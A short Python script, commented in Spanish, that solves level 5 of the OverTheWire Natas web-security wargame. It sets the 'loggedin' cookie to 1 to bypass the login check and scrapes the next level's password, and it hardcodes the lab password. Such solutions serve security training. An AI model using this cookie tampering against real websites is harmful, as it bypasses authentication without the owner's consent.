#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:ts=4:sw=4:et:ft=python:
"""
natas5.py

la cookie loggedin tiene valor 0 (false) por lo que hay que cambiarla para
poder acceder
"""
import re
import libnatas

# url: "http://natas5.natas.labs.overthewire.org"
# user: "natas5"
password = "V0p12qz30HEUU22dz7CZGHiFk3VdPA9Z"

natas = libnatas.NatasBrowser(level=5, password=password)
natas.open(natas.level_url)

# la cookie loggedin tiene valor 0 (false)
cookies = natas._ua_handlers['_cookies'].cookiejar
# print cookies[0]

# ... hay que cambiarlo a uno.
loggedin_cookie = cookies[0]
loggedin_cookie.value = "1"

# reabrimos la pagina con la cookie ya cambiada
soup = natas.get_html_soup(natas.level_url)
password_nl = natas.get_password(soup.prettify(), '.*natas6 is (.*)\W.*')
natas.print_password(password_nl)
